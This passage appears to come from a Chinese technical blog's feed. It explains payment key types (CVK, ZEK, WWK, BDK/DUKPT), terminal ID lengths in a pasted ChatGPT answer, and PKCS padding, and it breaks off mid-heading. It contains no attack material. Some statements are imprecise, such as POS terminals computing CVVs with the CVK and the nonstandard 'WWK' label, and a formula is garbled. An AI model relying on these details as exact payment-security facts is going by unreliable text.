的主要用途："></a>CVK 的主要用途：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 生成 CVV/CVC：CVK 主要用于生成银行卡上的验证码（CVV/CVC）。当持卡人进行交易时，系统使用卡号、有效期和服务码等信息通过 CVK 生成 CVV/CVC，用于验证卡片的真实性。</span><br><span class="line"></span><br><span class="line">2. 验证 CVV/CVC：在交易过程中，POS 终端或支付网关会将用户提供的卡片信息与系统生成的 CVV/CVC 进行比对，以确保交易的银行卡信息未被篡改。</span><br><span class="line"></span><br><span class="line">3. 保护交易安全：通过 CVK 生成和验证 CVV/CVC，银行能够减少由于卡片信息盗用或伪造导致的欺诈交易，尤其是在无卡交易（如电子商务）中。</span><br></pre></td></tr></table></figure><h2 id="CVK-的工作原理："><a href="#CVK-的工作原理：" class="headerlink" title="CVK 的工作原理："></a>CVK 的工作原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 生成 CVV/CVC：CVV（Card Verification Value）或 CVC（Card Verification Code）是银行卡上的三位或四位数字，用于在线交易或电话支付。CVV 是使用 CVK 和卡片的基本信息（如卡号、有效期、服务码）通过加密算法生成的。</span><br><span class="line">   生成过程如下：</span><br><span class="line">   </span><br><span class="line">   ○ 系统使用 CVK、卡号（PAN）、卡片有效期等输入数据。</span><br><span class="line">   </span><br><span class="line">   ○ 通过加密算法生成 CVV/CVC，这个值是唯一的，且基于卡片的相关信息。</span><br><span class="line"></span><br><span class="line">2. 验证过程：当进行交易时，系统使用 CVK 再次生成 CVV，并与持卡人提供的 CVV 进行比对。如果两个值一致，则表明卡片和交易信息有效，交易可以继续进行。</span><br></pre></td></tr></table></figure><h2 id="CVK-的典型使用场景："><a href="#CVK-的典型使用场景：" class="headerlink" title="CVK 的典型使用场景："></a>CVK 的典型使用场景：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. POS 终端交易：在 POS 终端交易中，当卡片插入或刷卡后，POS 系统会通过 CVK 生成 CVV 并验证该卡片的合法性，防止伪造的卡片被用于交易。</span><br><span class="line"></span><br><span class="line">2. 无卡交易（在线支付、电话支付）：在在线购物或电话支付等无卡交易中，持卡人需要输入银行卡的 CVV/CVC 以完成支付。系统会使用 CVK 验证输入的 CVV 是否与卡片信息匹配，以防止卡片信息被盗用。</span><br><span class="line"></span><br><span class="line">3. ATM 交易：在 ATM 交易中，CVK 可用于验证卡片的合法性，确保持卡人的交易安全。</span><br><span class="line">   </span><br><span class="line">   CVK 与 CVV/CVC 的关系：</span><br><span class="line">   </span><br><span class="line">   ● CVV（Card Verification Value） 和 CVC（Card Verification Code） 是银行卡背面或正面的三位或四位数字，用于验证在线交易或无卡交易中的卡片信息。</span><br><span class="line">   </span><br><span class="line">   ● CVK 是生成这些验证值的密钥，通过特定算法将卡号、有效期等信息与 CVK 结合生成唯一的 CVV/CVC。</span><br><span class="line">   </span><br><span class="line">   ● CVK 不仅用于生成 CVV，还用于在交易中验证 CVV 的正确性，确保交易的安全性和卡片信息的完整性。</span><br></pre></td></tr></table></figure><h2 id="CVK-的安全管理："><a href="#CVK-的安全管理：" class="headerlink" title="CVK 的安全管理："></a>CVK 的安全管理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 加密保护：由于 CVK 是生成 CVV/CVC 的核心密钥，必须得到严格的加密和保护。通常，CVK 会存储在硬件安全模块（HSM）中，以防止未经授权的访问和使用。</span><br><span class="line"></span><br><span class="line">2. 密钥分发：CVK 的分发需要通过高度安全的加密通道完成，确保密钥在传输过程中不会被截获或泄露。</span><br><span class="line"></span><br><span class="line">3. 定期更新：为了确保密钥的安全性，CVK 需要定期进行更新或轮换，以防止长期使用导致的潜在安全风险。</span><br><span class="line"></span><br><span class="line">4. 多因素保护：CVK 通常由多重身份验证机制保护，只有授权人员可以访问和管理 CVK，防止密钥被篡改或泄露。</span><br></pre></td></tr></table></figure><p>CVK 与其他密钥类型的区别：</p><p>● TPK（Terminal Pin Key）：TPK 用于加密和解密用户的 PIN 码，确保用户身份认证的安全。而 CVK 是用于生成和验证 CVV&#x2F;CVC，确保卡片的合法性，二者的用途不同。</p><p>● ZPK（Zone Pin Key）：ZPK 主要用于跨区域的 PIN 传输加密，确保区域之间的交易安全。而 CVK 则用于验证卡片信息的完整性和合法性。</p><p>● KEK（Key Encryption Key）：KEK 是用于加密其他密钥的密钥，CVK 则专门用于生成和验证银行卡的验证码。</p><h2 id="总结：-4"><a href="#总结：-4" class="headerlink" title="总结："></a>总结：</h2><p>CVK（Card Verification Key，卡验证密钥）是一种用于生成和验证银行卡验证码（如 CVV&#x2F;CVC）的密钥类型。它在金融交易中，特别是在无卡支付或在线交易中，确保交易中的卡片信息是合法且未被篡改。通过使用 CVK，银行和支付机构可以有效减少伪卡交易或欺诈交易，保障支付系统的安全。</p><h1 id="ZEK（Zone-Encryption-Key，区域加密密钥）"><a href="#ZEK（Zone-Encryption-Key，区域加密密钥）" class="headerlink" title="ZEK（Zone Encryption Key，区域加密密钥）"></a>ZEK（Zone Encryption Key，区域加密密钥）</h1><p>ZEK（Zone Encryption Key，区域加密密钥）是一种用于加密和解密金融交易系统中不同区域之间传输数据的密钥。ZEK 通常用于确保在金融网络中传输的敏感信息（如交易数据、用户信息等）在不同区域（Zone）之间是安全的，并且不会在传输过程中被截获或篡改。ZEK 是金融系统中的一种高等级密钥，专门用于保护跨区域的数据交换安全。</p><h2 id="ZEK-的主要用途："><a href="#ZEK-的主要用途：" class="headerlink" title="ZEK 的主要用途："></a>ZEK 的主要用途：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 数据加密与解密：ZEK 主要用于加密和解密在不同区域（如银行与支付处理商之间）传输的敏感数据。通过使用 ZEK 加密，敏感的交易信息在传输过程中即使被拦截，也无法被破解或篡改。</span><br><span class="line"></span><br><span class="line">2. 跨区域数据保护：在金融网络中，通常存在多个区域（例如不同银行的系统、支付网关、处理中心等）。ZEK 用于确保这些区域之间的数据传输安全可靠，防止跨区域的通信被窃听或恶意篡改。</span><br><span class="line"></span><br><span class="line">3. 密钥加密和传输：除了加密交易数据，ZEK 也可以用于加密其他密钥（例如会话密钥或工作密钥），以确保这些密钥在区域之间传输时不会泄露。</span><br></pre></td></tr></table></figure><h2 id="ZEK-的工作原理："><a href="#ZEK-的工作原理：" class="headerlink" title="ZEK 的工作原理："></a>ZEK 的工作原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 加密数据：ZEK 通过对称加密算法（如 DES、3DES）对跨区域传输的敏感数据进行加密。不同区域之间使用相同的 ZEK 进行加密和解密，确保只有授权的区域可以解密接收到的数据。</span><br><span class="line"></span><br><span class="line">2. 解密数据：接收方使用相同的 ZEK 对收到的加密数据进行解密，获取原始的交易信息或密钥。通过这种方式，确保数据在传输过程中不会被非法拦截或篡改。</span><br><span class="line"></span><br><span class="line">3. 跨区域密钥管理：ZEK 通常与其他密钥（如 ZPK、TPK 等）协同工作，以保护在不同金融机构、支付处理中心或区域之间的交易信息的安全。</span><br></pre></td></tr></table></figure><h2 id="ZEK-的典型使用场景："><a href="#ZEK-的典型使用场景：" class="headerlink" title="ZEK 的典型使用场景："></a>ZEK 的典型使用场景：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 银行与支付网关之间的数据传输：在银行系统与支付网关之间传输交易数据时，使用 ZEK 加密这些信息，确保交易数据在网络上传输时不会被窃取或篡改。</span><br><span class="line"></span><br><span class="line">2. 金融机构之间的敏感数据传输：在不同金融机构（如银行、支付处理中心、信用卡公司）之间传输敏感数据时，ZEK 用于加密这些信息，确保跨区域的交易和数据交换是安全的。</span><br><span class="line"></span><br><span class="line">3. ATM 与银行主机之间的数据传输：ATM 终端与银行服务器之间的通信常常使用 ZEK 进行加密，确保用户在 ATM 上进行的交易信息（如取款、转账等）在传输过程中不会被截获。</span><br></pre></td></tr></table></figure><h2 id="ZEK-与其他密钥类型的区别："><a href="#ZEK-与其他密钥类型的区别：" class="headerlink" title="ZEK 与其他密钥类型的区别："></a>ZEK 与其他密钥类型的区别：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">● ZPK（Zone Pin Key）：ZPK 专门用于加密和解密用户的 PIN 码，确保 PIN 在区域之间传输时的安全性。而 ZEK 主要用于加密交易数据或其他密钥，确保跨区域数据传输的安全。</span><br><span class="line"></span><br><span class="line">● TPK（Terminal Pin Key）：TPK 用于加密用户在终端设备（如 ATM、POS 终端）输入的 PIN 码，确保 PIN 码传输的安全性。ZEK 则专门用于保护区域之间的通信数据。</span><br><span class="line">   </span><br><span class="line">● KEK（Key Encryption Key）：KEK 是用于加密和传输其他密钥的密钥，ZEK 也可以用于密钥传输，但其主要作用是跨区域的数据加密。</span><br><span class="line"></span><br><span class="line">● ZMK（Zone Master Key）：ZMK 主要用于跨区域传输密钥，而 ZEK 主要用于跨区域传输交易数据和保护这些数据的安全。</span><br></pre></td></tr></table></figure><h2 id="ZEK-的安全管理："><a href="#ZEK-的安全管理：" class="headerlink" title="ZEK 的安全管理："></a>ZEK 的安全管理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 密钥的保护：由于 ZEK 用于保护跨区域的数据传输，其安全性至关重要。ZEK 通常存储在硬件安全模块（HSM）中，确保其不被非法访问或篡改。</span><br><span class="line"></span><br><span class="line">2. 定期轮换与更新：为了防止密钥泄露或长期使用带来的安全风险，ZEK 通常会定期进行轮换或更新。密钥更新过程需要通过安全的密钥管理系统进行。</span><br><span class="line"></span><br><span class="line">3. 多重身份验证：对 ZEK 的访问通常需要多重身份验证，确保只有授权的人员能够管理或使用该密钥。</span><br><span class="line"></span><br><span class="line">4. 密钥分发：ZEK 在不同区域之间的分发需要通过安全通道进行，确保密钥在传输过程中不会被截获或篡改。</span><br></pre></td></tr></table></figure><h2 id="总结：-5"><a href="#总结：-5" class="headerlink" title="总结："></a>总结：</h2><p>ZEK（Zone Encryption Key，区域加密密钥）是一种用于加密和解密在金融交易系统中不同区域之间传输数据的密钥类型。它通过加密跨区域的敏感信息，确保在银行、支付处理中心等不同系统之间传输的数据是安全的。ZEK 是保障金融网络安全的关键部分，特别是在确保跨区域通信和数据传输的保密性和完整性方面。</p><h1 id="WWK（Working-Key，工作密钥）"><a href="#WWK（Working-Key，工作密钥）" class="headerlink" title="WWK（Working Key，工作密钥）"></a>WWK（Working Key，工作密钥）</h1><p>WWK（Working Key，工作密钥）是一种在金融系统中用于加密和解密交易数据的密钥。它通常是一个临时使用的对称密钥，用于特定的交易会话。WWK 在密钥管理体系中被称为工作密钥，因为它在一段时间内有效，用于加密实际交易数据，确保敏感信息在传输中的安全性。</p><h2 id="WWK-的主要用途："><a href="#WWK-的主要用途：" class="headerlink" title="WWK 的主要用途："></a>WWK 的主要用途：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 交易数据加密：WWK 主要用于对金融交易数据进行加密。每次交易过程中，WWK 被用来加密敏感的交易信息（如 PIN、卡号、金额等），确保这些数据在传输时不被窃取或篡改。</span><br><span class="line"></span><br><span class="line">2. 临时会话密钥：WWK 通常是一个临时的密钥，专门用于一段时间或一个会话内的加密操作。在每个会话开始时，会生成一个新的 WWK，用于加密交易过程中的数据。</span><br><span class="line"></span><br><span class="line">3. 保护敏感数据：WWK 用于保护敏感信息，尤其是在终端设备（如 ATM 或 POS）与银行或支付网关之间传输时，确保交易过程中的数据是加密的，不会被攻击者读取或篡改。</span><br></pre></td></tr></table></figure><h2 id="WWK-的工作原理："><a href="#WWK-的工作原理：" class="headerlink" title="WWK 的工作原理："></a>WWK 的工作原理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 对称加密：WWK 使用对称加密算法（如 DES、3DES）来加密和解密交易数据。对称加密意味着加密和解密使用同一个密钥，这种方式比非对称加密效率更高，适合大量数据的加密操作。</span><br><span class="line"></span><br><span class="line">2. 生成与管理：WWK 是在会话或交易开始时生成的工作密钥，通常由一个主密钥（如 TMK 或 ZMK）派生出来，用于加密当前交易的数据。当会话结束时，WWK 会被销毁，保证密钥的临时性和安全性。</span><br><span class="line"></span><br><span class="line">3. 密钥加密与传输：为了安全地传输 WWK，通常会用更高等级的密钥（如 KEK 或 ZMK）对 WWK 进行加密，并在不同的系统或设备之间传输。接收方使用相应的主密钥解密后，才能使用 WWK 进行数据加密或解密。</span><br></pre></td></tr></table></figure><h2 id="WWK-的典型使用场景："><a href="#WWK-的典型使用场景：" class="headerlink" title="WWK 的典型使用场景："></a>WWK 的典型使用场景：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ATM 交易：在 ATM 终端中，当用户发起交易时，系统会生成一个 WWK 用于该会话的加密。WWK 加密了用户的 PIN、交易金额等信息，并通过安全通道发送给银行系统进行验证。</span><br><span class="line"></span><br><span class="line">2. POS 终端交易：POS 终端也会在交易开始时生成 WWK，用于加密用户的卡片信息、PIN 码等敏感数据，并通过支付网关发送到银行系统，确保交易的安全。</span><br><span class="line"></span><br><span class="line">3. 在线支付：在电子商务交易中，WWK 可以用于加密敏感的支付信息，确保在线支付过程中用户的卡片和交易数据的安全性。</span><br></pre></td></tr></table></figure><p>WWK 与其他密钥类型的区别：</p><p>● TMK（Terminal Master Key）：TMK 是终端设备中的主密钥，通常用于加密和保护 WWK 等工作密钥，而 WWK 是用于实际交易数据的加密密钥。</p><p>● ZMK（Zone Master Key）：ZMK 主要用于跨区域传输密钥，而 WWK 是用于当前会话或交易中的实际加密操作。ZMK 可以用于加密和传输 WWK，确保密钥在不同设备之间传输时的安全。</p><p>● KEK（Key Encryption Key）：KEK 用于加密其他密钥（如 WWK），确保这些密钥在传输过程中不会被窃取或篡改。而 WWK 直接用于加密交易数据。</p><p>● TPK（Terminal Pin Key）：TPK 主要用于加密用户的 PIN 码，而 WWK 则用于加密其他敏感交易信息，如卡号、金额等。</p><h2 id="WWK-的安全管理："><a href="#WWK-的安全管理：" class="headerlink" title="WWK 的安全管理："></a>WWK 的安全管理：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 密钥的安全传输：WWK 通常通过加密后传输，确保密钥在设备和系统之间传递时不会被拦截。通常使用 KEK 或 ZMK 加密 WWK，确保传输过程的安全性。</span><br><span class="line"></span><br><span class="line">2. 临时性与销毁：WWK 是一个临时的工作密钥，通常在会话结束后就会销毁，确保密钥不会长期使用，降低密钥泄露的风险。</span><br><span class="line"></span><br><span class="line">3. 定期更新：由于 WWK 是动态生成的，它会随着每次会话或交易而变化，因此无需长期存储。定期的密钥轮换和更新进一步保证了系统的安全性。</span><br></pre></td></tr></table></figure><h2 id="总结：-6"><a href="#总结：-6" class="headerlink" title="总结："></a>总结：</h2><p>WWK（Working Key，工作密钥）是一种用于加密和保护金融交易数据的临时密钥。它在每个交易会话中被动态生成，负责加密传输过程中的敏感信息，如用户的 PIN 码、卡号、交易金额等。通过使用 WWK，可以确保金融交易中的数据在传输过程中是安全的，防止数据被窃取或篡改。WWK 通常通过更高等级的密钥（如 KEK 或 ZMK）进行加密和传输，确保其在不同设备和系统之间的安全性。</p><h1 id="BDK（Base-Derivation-Key，基础派生密钥）"><a href="#BDK（Base-Derivation-Key，基础派生密钥）" class="headerlink" title="BDK（Base Derivation Key，基础派生密钥）"></a>BDK（Base Derivation Key，基础派生密钥）</h1><p>BDK（Base Derivation Key，基础派生密钥）是金融系统中常见的一种密钥类型，主要用于生成和管理一系列工作密钥（Working Keys），通常用于加密支付卡交易中的敏感数据，如 PIN 码和卡片信息。BDK 是一种主密钥，金融机构使用它来派生其他用于具体交易的密钥，从而提高系统的安全性和密钥管理的灵活性。</p><h2 id="BDK-的主要用途："><a href="#BDK-的主要用途：" class="headerlink" title="BDK 的主要用途："></a>BDK 的主要用途：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 密钥派生：BDK 是派生其他密钥（如 DUKPT，Derived Unique Key Per Transaction，每笔交易派生唯一密钥）的基础密钥。通过 BDK，系统可以根据不同的交易条件（如交易序列号或卡号）生成唯一的密钥，用于加密特定交易的数据。</span><br><span class="line"></span><br><span class="line">2. 生成动态密钥：BDK 常用于生成动态密钥，这些动态密钥用于加密敏感数据，如交易中的 PIN、卡号等。通过动态密钥，可以确保每一笔交易使用不同的密钥，从而增强安全性。</span><br><span class="line"></span><br><span class="line">3. 密钥管理与分发：BDK 帮助金融机构在大规模交易中管理和分发密钥。金融系统可以通过 BDK 派生出多个工作密钥，从而简化密钥管理，降低泄露风险。</span><br></pre></td></tr></table></figure><h2 id="BDK-的工作原理："><a href="#BDK-的工作原理：" class="headerlink" title="BDK 的工作原理："></a>BDK 的工作原理：</h2><p>BDK 使用的是对称加密算法（如 DES 或 3DES），并在金融交易系统中用于生成派生密钥。派生密钥通常与 DUKPT 机制结合使用，确保每笔交易都有独立的加密密钥。BDK 的密钥派生机制如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 生成派生密钥：当 POS 终端或 ATM 终端发起交易时，系统会通过 BDK 和交易中的某些特定信息（如卡号或终端的唯一标识符）生成一个派生密钥。这个密钥仅用于当前交易，并在交易结束后失效。</span><br><span class="line"></span><br><span class="line">2. 加密敏感数据：派生密钥用于加密交易中的敏感信息，如 PIN 码、卡号或其他客户数据。由于每笔交易使用的密钥都是不同的，即使攻击者截获了一个密钥或交易信息，也无法用于其他交易。</span><br><span class="line"></span><br><span class="line">3. 密钥派生机制的安全性：BDK 本身不会直接用于加密数据，而是用于生成派生密钥。这样，即使某个派生密钥被攻击者破解，其他交易的安全性也不会受到影响，因为每笔交易都有不同的密钥。</span><br><span class="line">```   </span><br><span class="line"></span><br><span class="line">## BDK 的典型使用场景：</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p>DUKPT 密钥管理体系：BDK 是 DUKPT（Derived Unique Key Per Transaction，每笔交易派生唯一密钥）体系的核心。在这种体系中，POS 终端或 ATM 使用 BDK 派生出交易唯一密钥，用于加密每次交易的 PIN 或其他敏感信息。</p></li><li><p>POS 终端和 ATM 交易：在 POS 或 ATM 终端中，BDK 用于派生密钥并加密交易数据。当持卡人在终端输入 PIN 时，终端生成的派生密钥通过 BDK 进行计算，确保每笔交易都有独立的加密密钥。</p></li><li><p>加密交易的敏感数据：BDK 生成的派生密钥用于加密金融交易中的各种敏感数据，包括客户的 PIN 码、卡号、交易金额等，确保这些数据在传输过程中不会被泄露或篡改。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">BDK 与其他密钥类型的区别：</span><br><span class="line"></span><br><span class="line">● TPK（Terminal Pin Key）：TPK 专门用于加密用户输入的 PIN 码，而 BDK 是用于派生密钥的基础密钥，帮助生成多个不同的工作密钥。</span><br><span class="line">   </span><br><span class="line">● KEK（Key Encryption Key）：KEK 用于加密其他密钥，而 BDK 是用于生成动态派生密钥。BDK 不直接加密数据，但通过派生机制来间接实现加密。</span><br><span class="line">   </span><br><span class="line">● ZMK（Zone Master Key）：ZMK 是用于区域之间传输和加密密钥的主密钥，而 BDK 主要用于生成交易中的动态密钥，确保每笔交易的密钥独立。</span><br><span class="line"></span><br><span class="line">● WWK（Working Key）：WWK 是交易中用于加密具体数据的临时工作密钥，而 BDK 是用于生成这些工作密钥的基础密钥。 </span><br><span class="line">## BDK 的安全管理：</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>密钥保护：BDK 是高度敏感的主密钥，通常存储在硬件安全模块（HSM）中，以确保密钥的安全性，防止未经授权的访问或泄露。</p></li><li><p>密钥轮换与更新：金融机构通常会定期更新 BDK 以防止长期使用带来的安全风险。密钥的更新过程通常通过高度加密的通道进行，确保密钥传输的安全性。</p></li><li><p>密钥分发：BDK 不会直接分发到终端设备中。相反，终端设备使用一个派生机制来通过 BDK 生成交易密钥。终端和服务器之间的通信必须通过安全的加密通道，以确保敏感信息的传输安全。</p></li></ol><pre><code>## 总结：BDK（Base Derivation Key，基础派生密钥）是金融系统中用于生成派生密钥的重要主密钥。它通过派生机制生成动态的工作密钥，确保每笔交易的加密数据都是独立的，从而增强了交易的安全性。BDK 通常用于 DUKPT 密钥管理体系，在 ATM、POS 终端以及其他金融交易中广泛应用。由于 BDK 对金融系统的安全至关重要，它通常受到严格的保护和管理，存储在安全的硬件模块中，并定期进行轮换和更新。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 加密平台 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PKCS填充方式</title>
      <link href="/archives/dd23fb4f.html"/>
      <url>/archives/dd23fb4f.html</url>
      
        <content type="html"><![CDATA[<h1 id="终端编号"><a href="#终端编号" class="headerlink" title="终端编号"></a>终端编号</h1><p>终端编号（Terminal ID，简称 TID）在金融支付系统中是用于唯一标识 POS 终端、ATM 终端或其他支付设备的编号。终端编号的长度可以根据系统设计和地区标准的不同有所变化，但在大多数情况下，终端编号一般是 8 位到 15 位。</p><h2 id="终端编号的常见位数："><a href="#终端编号的常见位数：" class="headerlink" title="终端编号的常见位数："></a>终端编号的常见位数：</h2><ol><li><p>8 位：这是在大多数支付系统中常见的终端编号长度，尤其是在 POS 机中。许多金融机构、支付网关和服务商会使用 8 位的编号来唯一标识每个支付终端设备。</p><p>○ 例子：12345678</p></li><li><p>12 位到 15 位：在一些系统中，尤其是较为复杂的支付系统或者有多个分支机构的场景下，终端编号可能会更长，以提供更多的唯一标识符。这在需要更多细粒度控制和管理的支付网络中较为常见。</p><p>○ 例子：123456789012（12位）、123456789012345（15位）</p></li></ol><h2 id="终端编号的构成："><a href="#终端编号的构成：" class="headerlink" title="终端编号的构成："></a>终端编号的构成：</h2><p><strong>●</strong> 前几位：在一些系统中，终端编号的前几位可能代表某些特定的标识信息，如区域代码、分支机构编号等。</p><p><strong>●</strong> 后几位：通常用于唯一标识特定的终端设备。</p><h2 id="不同支付系统的情况："><a href="#不同支付系统的情况：" class="headerlink" title="不同支付系统的情况："></a>不同支付系统的情况：</h2><p><strong>●</strong> POS 机：POS 终端编号一般为 8 位，但某些支付平台可能使用 12 位或更长的终端编号。</p><p><strong>●</strong> ATM 机：ATM 终端编号通常也是 8 位到 12 位，具体取决于银行或支付服务提供商的规定。</p><p><strong>●</strong> 在线支付网关：一些线上支付网关可能会使用更长的编号以支持更复杂的系统。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p><strong>●</strong> 终端编号一般为 8 位，但根据系统设计和需求，可能会有 12 位到 15 位的情况。具体长度取决于支付系统或服务提供商的设计规范。</p><h2 id="为什么是8位，不可以是9位，10位吗"><a href="#为什么是8位，不可以是9位，10位吗" class="headerlink" title="为什么是8位，不可以是9位，10位吗"></a>为什么是8位，不可以是9位，10位吗</h2><p>ChatGPT 说：</p><p>终端编号（Terminal ID, TID）的长度通常由系统设计规范决定，不是严格限定为 8 位。8 位只是支付行业中一个比较常见的标准，实际上，终端编号可以是9 位、10 位或其他长度，具体取决于以下几个因素：</p><h3 id="1-支付系统或机构的规范"><a href="#1-支付系统或机构的规范" class="headerlink" title="1. 支付系统或机构的规范"></a>1. 支付系统或机构的规范</h3><p>每个支付系统、银行或支付服务提供商可能会根据他们的需求制定自己的终端编号规范。终端编号的位数并没有统一的全球标准，各个系统和地区的规定可能不同：</p><p><strong>●</strong> 8 位 是常见的标准，因为它足够大可以唯一标识数以百万计的终端设备，并且简洁易记。</p><p><strong>●</strong> 9 位、10 位甚至更长 的编号通常用于需要管理大量终端的复杂支付网络，如跨国支付系统、大型连锁店的支付终端等。</p><h3 id="2-唯一性和设备数量的需求"><a href="#2-唯一性和设备数量的需求" class="headerlink" title="2. 唯一性和设备数量的需求"></a>2. 唯一性和设备数量的需求</h3><p>终端编号的主要功能是唯一标识每个支付终端。8 位数字提供了 1 亿（108&#x3D;100,000,00010^8 &#x3D; 100,000,000108&#x3D;100,000,000）种不同的组合，这对许多中小规模的支付网络来说是足够的。如果需要管理的终端数量超过 1 亿，支付系统可能会选择使用更多位数的终端编号，例如 9 位（10亿种组合）或 10 位（100亿种组合）。</p><h3 id="3-地区或行业的标准化"><a href="#3-地区或行业的标准化" class="headerlink" title="3. 地区或行业的标准化"></a>3. 地区或行业的标准化</h3><p>在某些地区或行业中，可能会有特定的终端编号规范。某些标准化组织或支付网络可能推荐或要求使用某一固定长度的编号：</p><p><strong>●</strong> 在一些国家或地区，支付终端编号可能会与银行、商户等其他标识符配合使用，因此可能会设计更长的编号（例如 9 位或 10 位），以适应业务的复杂性和扩展性。</p><p><strong>●</strong> 例如，大型银行或跨国支付系统可能需要更长的编号来区分不同的国家、分支机构和商户。</p><h3 id="4-系统兼容性和设计习惯"><a href="#4-系统兼容性和设计习惯" class="headerlink" title="4. 系统兼容性和设计习惯"></a>4. 系统兼容性和设计习惯</h3><p><strong>8 位终端编号</strong> 已经是许多支付系统中的惯例，很多系统和软件的设计都基于这一长度，因此在设计新系统时，遵循现有的设计习惯能够减少兼容性问题。</p><p><strong>●</strong> 如果一个支付系统已经支持了 8 位终端编号，增加更多位数可能需要修改现有系统中的数据库结构、数据验证逻辑等，这涉及到兼容性和系统更新的问题。因此，许多系统选择保持使用 8 位。</p><p><strong>●</strong> 然而，随着支付网络的扩展和技术的发展，某些系统可能会根据实际需求，使用 <strong>9 位</strong>、<strong>10 位</strong>甚至更多位数的终端编号。</p><h3 id="5-未来扩展性"><a href="#5-未来扩展性" class="headerlink" title="5. 未来扩展性"></a>5. 未来扩展性</h3><p>   对于一些更大型的支付系统或未来扩展需求较大的网络，设计时可能会预留更多位数的编号，例如 10 位或更长，以便在未来增加更多的终端时无需重新设计编号系统。</p><h3 id="6-编码的安全性与分层结构"><a href="#6-编码的安全性与分层结构" class="headerlink" title="6. 编码的安全性与分层结构"></a>6. 编码的安全性与分层结构</h3><p>某些支付系统可能会在终端编号中包含分层结构，例如：</p><p><strong>● 前几位</strong>：可能表示区域、分支机构、商户号等信息。</p><p><strong>● 后几位</strong>：唯一标识该商户或区域内的支付终端。</p><p>这种分层结构可能需要更多位数的编号，特别是在大型跨国支付系统中，这样可以使编号更具扩展性和管理性。</p><h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><p>虽然 8 位 是很多支付系统中常见的终端编号长度，但没有技术限制必须是8位。支付系统可以根据实际的规模、唯一性需求、标准化、扩展性等因素使用 9 位、10 位甚至更长 的终端编号。因此，终端编号可以是 8 位、9 位、10 位或其他长度，具体取决于支付系统的设计需求和规范。</p><h1 id="PKCS11填充方式"><a href="#PKCS11填充方式" class="headerlink" title="PKCS11填充方式"></a>PKCS11填充方式</h1><p>在 PKCS#11（Public-Key Cryptography Standards #11）标准中，填充方式（Padding） 是一种确保数据块符合加密算法要求的机制。PKCS#11 是一种应用程序接口（API），用于管理和执行密码操作，如密钥生成、加密、解密和数字签名。填充方式在加密时尤为重要，特别是在使用分组加密算法时，如 AES 和 DES。</p><h2 id="1-PKCS-1-填充（用于-RSA-加密-x2F-签名）"><a href="#1-PKCS-1-填充（用于-RSA-加密-x2F-签名）" class="headerlink" title="1. PKCS#1 填充（用于 RSA 加密&#x2F;签名）"></a>1. PKCS#1 填充（用于 RSA 加密&#x2F;签名）</h2><p><strong>●</strong> PKCS#1 v1.5 填充通常用于 RSA 加密和签名操作。</p><p><strong>●</strong> 主要用于非对称加密算法，如 RSA，确保输入数据符合固定长度要求。</p><p><strong>●</strong> 在 PKCS#11 中，填充方式由 CKM_RSA_PKCS 机制定义。</p><h3 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h3><p><strong>●</strong> 当数据块长度小于 RSA 模块大小时，填充额外的字节以确保输入数据长度与 RSA 模块相同。</p><p><strong>●</strong> 对于加密：填充由随机数生成器生成的随机数据。</p><p><strong>●</strong> 对于签名：填充是基于哈希值的结构化数据，确保签名消息的完整性和安全性。</p><h2 id="2-PKCS-7-填充"><a href="#2-PKCS-7-填充" class="headerlink" title="2. PKCS#7 填充"></a>2. PKCS#7 填充</h2><p><strong>●</strong> PKCS#7 填充是一种常见的分组加密填充方式，主要用于对称加密算法如 AES 和 DES，用于确保数据长度是加密块的整数倍。</p><p><strong>●</strong> PKCS#11 使用的分组加密算法通常需要 PKCS#7 填充来确保输入数据与算法要求的块大小相匹配。</p><h3 id="工作原理：-1"><a href="#工作原理：-1" class="headerlink" title="工作原理："></a>工作原理：</h3><p><strong>●</strong> 每个块的大小通常是 8 字节或 16 字节，如果最后一个块的长度不足，则在最后一个块上填充数据。</p><p><strong>●</strong> 填充的字节内容为填充的字节数。例如，如果最后需要填充 3 个字节，每个字节填充的值都是 0x03。</p><h2 id="3-零填充（Zero-Padding）"><a href="#3-零填充（Zero-Padding）" class="headerlink" title="3. 零填充（Zero Padding）"></a>3. 零填充（Zero Padding）</h2><p><strong>●</strong> 零填充 也是一种常见的填充方式，通常用于一些对称加密算法，尤其是数据本身不包含尾随零时。</p><p><strong>●</strong> 它通过在数据的末尾填充 0x00 字节来完成。</p><h3 id="工作原理：-2"><a href="#工作原理：-2" class="headerlink" title="工作原理："></a>工作原理：</h3><p><strong>●</strong> 填充的数据为 0x00，直到最后一个块达到算法所要求的块大小。</p><p><strong>●</strong> 适用于一些没有显式填充要求的分组加密模式。</p><h2 id="4-OAEP-填充（Optimal-Asymmetric-Encryption-Padding，最优非对称加密填充）"><a href="#4-OAEP-填充（Optimal-Asymmetric-Encryption-Padding，最优非对称加密填充）" class="headerlink" title="4. OAEP 填充（Optimal Asymmetric Encryption Padding，最优非对称加密填充）"></a>4. OAEP 填充（Optimal Asymmetric Encryption 